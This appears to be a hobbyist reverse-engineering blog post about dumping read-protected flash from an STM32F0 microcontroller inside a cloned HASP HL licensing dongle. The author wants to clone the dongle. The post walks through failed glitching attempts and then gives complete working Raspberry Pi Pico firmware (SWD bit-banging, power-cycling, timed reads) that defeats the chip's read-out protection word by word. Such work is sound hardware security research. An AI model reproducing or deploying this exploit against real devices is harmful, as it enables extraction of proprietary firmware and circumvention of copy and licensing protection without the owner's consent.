---
title: 'STM32F0x Protected Firmware Dumper'
date: 2024-01-16T02:23:00-03:00
author: Lucas Teske
layout: post
image: /assets/posts/patreon/Pasted image 20230124035811.png
categories:
  - Reverse Engineering
  - Hardware Hacking
tags:
  - Protected Firmware
  - Hardware Hacking
  - RE
  - Reverse Engineering
  - STM32
  - Patreon
  - MCU

---

In the process of my hobby hardware hacking, I encountered a Chinese clone of a HASP HL dongle equipped with a STM32F042G6U6 processor. My intention was to clone it, and during my exploration, I discovered four pins from the SWD debug interface located at the bottom of the PCB. I soldered a 4-pin header to these pins for ease of access.

Utilizing my Segger J-Link as a debug probe, although any JTAG adapter should suffice, I paired it with OpenOCD. Given that the chipset is recognized by OpenOCD, I crafted a script to extract all possible data, conditional upon enablement.

```
adapter driver jlink
transport select swd
adapter_khz 4000
source [find target/stm32f0x.cfg]
init
dap info
reset halt
flash read_bank 0 firmwareF1.bin 0 0x8000
reset
shutdown
```

But, hit a snag - the device’s RDP (Read-Out Protection) was on, even though SWD was active. No biggie, I thought, and tried to bypass this with voltage fault injection. However, the internal clock generator in the device made clock glitching a no-go. After a few hours of getting nowhere, it was clear I needed a new game plan.

My search for alternatives led me to a comprehensive paper detailing three methodologies to extract protected memory:

[https://www.aisec.fraunhofer.de/en/FirmwareProtection.html](https://www.aisec.fraunhofer.de/en/FirmwareProtection.html)

I gave the Cold Boot Method a shot, but no dice - probably because I couldn’t tinker with the device’s clock, and that’s pretty much a deal-breaker for it to work. The UVC method? Too risky, and I wasn’t about to wreck the dongle. So, that left me with SWD Debug Port glitching.

Now, there was a PoC for this glitch, and it had some good info, but it was all about STM32 code with a bunch of device-specific stuff. I needed something more universal. After combing through the PoC and the paper, I mixed in some of my own sauce and crafted a new code.

For the testing ground, I hooked up a Raspberry Pi Pico with [platform.io](http://platform.io/). I had to go direct with the SWD protocol since standard debug probes like my J-Link were too nosy with device initialization. This glitch needed a quick draw on the flash read, and every millisecond counted.

Here’s the kicker - the code’s protection only kicks in when you try to touch the flash memory with debug mode on. But if you’re quick on the draw, you can snag a DWORD from the flash before the doors slam shut.

To pull the whole firmware, it’s a dance with the reset pin and the device’s power supply. You’ve got to power cycle to reset the debug mode flag. Here’s the play-by-play:

1. Hit the reset pin
2. Juice up the device
3. Release the reset pin
4. Make the read
5. Cut the power
6. Run it back

The Raspberry Pi Pico was all I needed to power the device since the STM32 doesn’t pull much juice. If you’re dealing with something thirstier, a transistor or relay to flip the power might be the way to go. You can check out the whole operation and the code over at [https://github.com/racerxdl/stm32f0-pico-dump](https://github.com/racerxdl/stm32f0-pico-dump) or available below.

![Working dump of bytes](/assets/posts/patreon/Pasted image 20230124035820.png)
*An image showcasing streams of DWORD data from the STM32F0 firmware being transmitted in real-time via the Raspberry Pi Pico’s serial port, illuminating the terminal with lines of extracted code.*


## Code


### hal.c

```c
/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */

#include "main.h"

void targetInit(void) {
    targetPowerOff();
    targetReset();
}

void targetReset(void) {
    digitalWrite(TARGET_RESET_Pin, LOW);
}

void targetRestore(void) {
    digitalWrite(TARGET_RESET_Pin, HIGH);
}

void targetPowerOff(void) {
    digitalWrite(TARGET_PWR_Pin, LOW);
}

void targetPowerOn(void) {
    digitalWrite(TARGET_PWR_Pin, HIGH);
}
```

### reader.c

```c
/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */

#include "main.h"
#include "swd.h"

/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */
swdStatus_t extractFlashData(uint32_t const address, uint32_t* const data) {
    swdStatus_t dbgStatus;

    /* Add some jitter on the moment of attack (may increase attack effectiveness) */
    static uint16_t delayJitter = DELAY_JITTER_MS_MIN;

    uint32_t extractedData = 0u;
    uint32_t idCode = 0u;

    /* Limit the maximum number of attempts PER WORD */
    uint32_t numReadAttempts = 0u;

    /* try up to MAX_READ_TRIES times until we have the data */
    do {
        digitalWrite(LED1_Pin, LOW);

        targetPowerOn();

        delay(5);

        dbgStatus = swdInit(&idCode);

        if (dbgStatus == swdStatusOk) {
            dbgStatus = swdEnableDebugIF();
        }

        if (dbgStatus == swdStatusOk) {
            dbgStatus = swdSetAP32BitMode(NULL);
        }

        if (dbgStatus == swdStatusOk) {
            dbgStatus = swdSelectAHBAP();
        }

        if (dbgStatus == swdStatusOk) {
            targetRestore();
            delay(delayJitter);

            /* The magic happens here! */
            dbgStatus = swdReadAHBAddr((address & 0xFFFFFFFCu), &extractedData);
        }

        targetReset();

        /* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */
        if (dbgStatus == swdStatusOk) {
            *data = extractedData;
            digitalWrite(LED1_Pin, HIGH);
        } else {
            ++numReadAttempts;

            delayJitter += DELAY_JITTER_MS_INCREMENT;
            if (delayJitter >= DELAY_JITTER_MS_MAX) {
                delayJitter = DELAY_JITTER_MS_MIN;
            }
        }

        targetPowerOff();

        delay(1);
        targetRestore();
        delay(2);
        targetReset();
        delay(1);

    } while ((dbgStatus != swdStatusOk) && (numReadAttempts < (MAX_READ_ATTEMPTS)));

    return dbgStatus;
}
```

### swd.c

```c
/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */

#include "swd.h"

#include "main.h"

#define MWAIT __asm__ __volatile__( \
    ".syntax unified 		\n"          \
    "	movs r0, #0x20 		\n"          \
    "1: 	subs r0, #1 		\n"          \
    "	bne 1b 			\n"                 \
    ".syntax divided"               \
    :                               \
    :                               \
    : "cc", "r0")

#define N_READ_TURN (3u)

static uint8_t swdParity(uint8_t const* data, uint8_t const len);
static void swdDatasend(uint8_t const* data, uint8_t const len);
static void swdDataIdle(void);
static void swdDataPP(void);
static void swdTurnaround(void);
static void swdReset(void);
static void swdDataRead(uint8_t* const data, uint8_t const len);
static void swdBuildHeader(swdAccessDirection_t const adir, swdPortSelect_t const portSel, uint8_t const A32, uint8_t* const header);
static swdStatus_t swdReadPacket(swdPortSelect_t const portSel, uint8_t const A32, uint32_t* const data);
static swdStatus_t swdWritePacket(swdPortSelect_t const portSel, uint8_t const A32, uint32_t const data);
static swdStatus_t swdReadAP0(uint32_t* const data);

static uint8_t swdParity(uint8_t const* data, uint8_t const len) {
    uint8_t par = 0u;
    uint8_t cdata = 0u;
    uint8_t i;

    for (i = 0u; i < len; ++i) {
        if ((i & 0x07u) == 0u) {
            cdata = *data;
            ++data;
        }

        par ^= (cdata & 0x01u);
        cdata >>= 1u;
    }

    return par;
}

static void swdDatasend(uint8_t const* data, uint8_t const len) {
    uint8_t cdata = 0u;
    uint8_t i;

    for (i = 0u; i < len; ++i) {
        if ((i & 0x07u) == 0x00u) {
            cdata = *data;
            ++data;
        }

        if ((cdata & 0x01u) == 0x01u) {
            digitalWrite(SWDIO_Pin, HIGH);
        } else {
            digitalWrite(SWDIO_Pin, LOW);
        }
        MWAIT;

        digitalWrite(SWCLK_Pin, HIGH);
        MWAIT;
        digitalWrite(SWCLK_Pin, LOW);
        cdata >>= 1u;
        MWAIT;
    }
}

static void swdDataIdle(void) {
    digitalWrite(SWDIO_Pin, HIGH);
    MWAIT;
    pinMode(SWDIO_Pin, INPUT);
    MWAIT;
}

static void swdDataPP(void) {
    MWAIT;
    digitalWrite(SWDIO_Pin, LOW);
    pinMode(SWDIO_Pin, OUTPUT);
    MWAIT;
}

static void swdTurnaround(void) {
    digitalWrite(SWCLK_Pin, HIGH);
    MWAIT;
    digitalWrite(SWCLK_Pin, LOW);
    MWAIT;
}

static void swdDataRead(uint8_t* const data, uint8_t const len) {
    uint8_t i;
    uint8_t cdata = 0u;

    MWAIT;
    swdDataIdle();
    MWAIT;

    for (i = 0u; i < len; ++i) {
        cdata >>= 1u;
        cdata |= digitalRead(SWDIO_Pin) ? 0x80u : 0x00u;
        data[(((len + 7u) >> 3u) - (i >> 3u)) - 1u] = cdata;

        digitalWrite(SWCLK_Pin, HIGH);
        MWAIT;
        digitalWrite(SWCLK_Pin, LOW);
        MWAIT;

        /* clear buffer after reading 8 bytes */
        if ((i & 0x07u) == 0x07u) {
            cdata = 0u;
        }
    }
}

static void swdReset(void) {
    uint8_t i;

    MWAIT;
    digitalWrite(SWCLK_Pin, HIGH);
    digitalWrite(SWDIO_Pin, HIGH);
    MWAIT;

    /* 50 clk+x */
    for (i = 0u; i < (50u + 10u); ++i) {
        digitalWrite(SWCLK_Pin, HIGH);
        MWAIT;
        digitalWrite(SWCLK_Pin, LOW);
        MWAIT;
    }

    digitalWrite(SWDIO_Pin, LOW);

    for (i = 0u; i < 3u; ++i) {
        digitalWrite(SWCLK_Pin, HIGH);
        MWAIT;
        digitalWrite(SWCLK_Pin, LOW);
        MWAIT;
    }
}

static void swdBuildHeader(swdAccessDirection_t const adir, swdPortSelect_t const portSel, uint8_t const A32, uint8_t* const header) {
    if (portSel == swdPortSelectAP) {
        *header |= 0x02u; /* Access AP */
    }

    if (adir == swdAccessDirectionRead) {
        *header |= 0x04u; /* read access */
    }

    switch (A32) {
        case 0x01u:
            *header |= 0x08u;
            break;

        case 0x02u:
            *header |= 0x10u;
            break;

        case 0x03u:
            *header |= 0x18u;
            break;

        default:
        case 0x00u:

            break;
    }

    *header |= swdParity(header, 7u) << 5u;
    *header |= 0x01u; /* startbit */
    *header |= 0x80u;
}

static swdStatus_t swdReadPacket(swdPortSelect_t const portSel, uint8_t const A32, uint32_t* const data) {
    swdStatus_t ret;
    uint8_t header = 0x00u;
    uint8_t rp[1] = {0x00u};
    uint8_t resp[5] = {0u};
    uint8_t i;

    swdBuildHeader(swdAccessDirectionRead, portSel, A32, &header);

    swdDatasend(&header, 8u);
    swdDataIdle();
    swdTurnaround();
    swdDataRead(rp, 3u);

    swdDataRead(resp, 33u);

    swdDataPP();

    for (i = 0u; i < N_READ_TURN; ++i) {
        swdTurnaround();
    }

    *data = resp[4] | (resp[3] << 8u) | (resp[2] << 16u) | (resp[1] << 24u);

    ret = rp[0];

    return ret;
}

static swdStatus_t swdWritePacket(swdPortSelect_t const portSel, uint8_t const A32, uint32_t const data) {
    swdStatus_t ret;
    uint8_t header = 0x00u;
    uint8_t rp[1] = {0x00u};
    uint8_t data1[5] = {0u};
    uint8_t i;

    swdBuildHeader(swdAccessDirectionWrite, portSel, A32, &header);

    swdDatasend(&header, 8u);
    MWAIT;

    swdDataIdle();
    MWAIT;

    swdTurnaround();

    swdDataRead(rp, 3u);

    swdDataIdle();

    swdTurnaround();
    swdDataPP();

    data1[0] = data & 0xFFu;
    data1[1] = (data >> 8u) & 0xFFu;
    data1[2] = (data >> 16u) & 0xFFu;
    data1[3] = (data >> 24u) & 0xFFu;
    data1[4] = swdParity(data1, 8u * 4u);

    swdDatasend(data1, 33u);

    swdDataPP();

    for (i = 0u; i < 20u; ++i) {
        swdTurnaround();
    }

    ret = rp[0];

    return ret;
}

swdStatus_t swdReadIdcode(uint32_t* const idCode) {
    uint32_t ret;

    ret = swdReadPacket(swdPortSelectDP, 0x00u, idCode);

    return ret;
}

swdStatus_t swdSelectAPnBank(uint8_t const ap, uint8_t const bank) {
    swdStatus_t ret = swdStatusNone;
    uint32_t data = 0x00000000u;

    data |= (uint32_t)(ap & 0xFFu) << 24u;
    data |= (uint32_t)(bank & 0x0Fu) << 0u;

    /* write to select register */
    ret |= swdWritePacket(swdPortSelectDP, 0x02u, data);

    return ret;
}

static swdStatus_t swdReadAP0(uint32_t* const data) {
    swdStatus_t ret = swdStatusNone;

    swdReadPacket(swdPortSelectAP, 0x00u, data);

    return ret;
}

swdStatus_t swdSetAP32BitMode(uint32_t* const data) {
    swdStatus_t ret = swdStatusNone;

    swdSelectAPnBank(0x00u, 0x00u);

    uint32_t d = 0u;

    ret |= swdReadAP0(&d);

    ret |= swdReadPacket(swdPortSelectDP, 0x03u, &d);

    d &= ~(0x07u);
    d |= 0x02u;

    ret |= swdWritePacket(swdPortSelectAP, 0x00u, d);

    ret |= swdReadAP0(&d);
    ret |= swdReadPacket(swdPortSelectDP, 0x03u, &d);

    if (data != NULL) {
        *data = d;
    }

    return ret;
}

swdStatus_t swdSelectAHBAP(void) {
    swdStatus_t ret = swdSelectAPnBank(0x00u, 0x00u);

    return ret;
}

swdStatus_t swdReadAHBAddr(uint32_t const addr, uint32_t* const data) {
    swdStatus_t ret = swdStatusNone;
    uint32_t d = 0u;

    ret |= swdWritePacket(swdPortSelectAP, 0x01u, addr);

    ret |= swdReadPacket(swdPortSelectAP, 0x03u, &d);
    ret |= swdReadPacket(swdPortSelectDP, 0x03u, &d);

    *data = d;

    return ret;
}

swdStatus_t swdEnableDebugIF(void) {
    swdStatus_t ret = swdStatusNone;

    ret |= swdWritePacket(swdPortSelectDP, 0x01u, 0x50000000u);

    return ret;
}

swdStatus_t swdInit(uint32_t* const idcode) {
    swdStatus_t ret = swdStatusNone;

    swdReset();
    ret |= swdReadIdcode(idcode);

    return ret;
}
```

### main.cpp

```c++
/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */

#include <Arduino.h>

extern "C" {
    #include "main.h"
    #include "reader.h"
}

// STM32 target flash memory size in bytes
uint32_t size = 32768;

// Usually the STM32F0x starts here.
// If you're trying to dump another series check the datasheet.
uint32_t flashAddress = 0x08000000;

void setup() {
    swdStatus_t status;
    Serial.begin(115200);

    pinMode(TARGET_RESET_Pin, OUTPUT);
    pinMode(TARGET_PWR_Pin, OUTPUT);
    pinMode(SWDIO_Pin, OUTPUT);
    pinMode(SWCLK_Pin, OUTPUT);

    targetInit();
    digitalWrite(LED1_Pin, HIGH);
    while(!Serial.available()) {
        delay(1000);
        Serial.println("Send anything to start...");
    }
    Serial.println("Starting");

    uint32_t flashData = 0;
    for (uint32_t i = 0; i < size; i+=4) {
        flashData = 0;
        status = extractFlashData(flashAddress + i, &flashData);
        if (status != swdStatusOk) {
            Serial.printf("Error reading: %d\r\n", status);
            break;
        }
        Serial.printf("%08x: %08x\r\n", flashAddress + i, flashData);
    }
    Serial.println("DONE");
}

void loop() {}
```
